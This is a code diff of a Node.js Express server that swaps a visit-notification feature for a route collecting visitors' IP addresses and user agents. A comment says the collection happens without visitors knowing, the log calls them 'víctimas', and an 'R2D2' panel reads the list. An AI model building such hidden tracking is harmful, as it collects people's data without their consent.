@@ -1,51 +1,46 @@
 const express = require('express');
-const app = express();
 const path = require('path');
+const app = express();
 
 app.use(express.json());
 app.use(express.static('public'));
 
-// Almacenar clientes conectados al evento SSE
-let clients = [];
+// Guardar IPs detectadas
+let ipsDetectadas = [];
 
-// Ruta SSE para notificaciones en tiempo real
-app.get('/events', (req, res) => {
-    res.setHeader('Content-Type', 'text/event-stream');
-    res.setHeader('Cache-Control', 'no-cache');
-    res.setHeader('Connection', 'keep-alive');
-    
-    const clientId = Date.now();
-    const newClient = { id: clientId, res };
-    clients.push(newClient);
-    
-    req.on('close', () => {
-        clients = clients.filter(c => c.id !== clientId);
-    });
-});
-
-// Función para enviar notificación a todos los clientes SSE
-function notificarNuevaVisita(ip, userAgent) {
-    const data = {
+// Ruta para que los visitantes reporten su IP (sin que lo sepan)
+app.post('/registrar', (req, res) => {
+    const { ip, userAgent } = req.body;
+    const registro = {
         ip: ip,
         userAgent: userAgent,
-        timestamp: new Date().toLocaleString()
+        timestamp: new Date().toLocaleString(),
+        id: Date.now()
     };
-    clients.forEach(client => client.res.write(`data: ${JSON.stringify(data)}\n\n`));
-}
+    ipsDetectadas.unshift(registro);
+    console.log(`[R2D2] Nueva víctima: ${ip}`);
+    res.json({ status: 'oculto' });
+});
 
-// Ruta que recibe los datos del visitante
-app.post('/visita', (req, res) => {
-    const { ip, userAgent } = req.body;
-    console.log(`[NUEVA VISITA] IP: ${ip} - UA: ${userAgent}`);
-    
-    // Notificar a los administradores
-    notificarNuevaVisita(ip, userAgent);
-    
-    res.json({ status: 'ok' });
+// Ruta para que R2D2 obtenga las IPs
+app.get('/api/ips', (req, res) => {
+    res.json(ipsDetectadas);
+});
+
+// Ruta para limpiar (opcional)
+app.delete('/api/limpiar', (req, res) => {
+    ipsDetectadas = [];
+    res.json({ status: 'limpiado' });
 });
 
 const PORT = 3000;
 app.listen(PORT, () => {
-    console.log(`Servidor corriendo en http://localhost:${PORT}`);
-    console.log(`Abre esta URL en dos navegadores diferentes para probar`);
+    console.log(`
+    ╔══════════════════════════════════════╗
+    ║   👁️  SERVIDOR TERROR ACTIVADO  👁️   ║
+    ╠══════════════════════════════════════╣
+    ║  Visitantes: http://localhost:3000   ║
+    ║  Panel R2D2: http://localhost:3000/admin.html ║
+    ╚══════════════════════════════════════╝
+    `);
 });
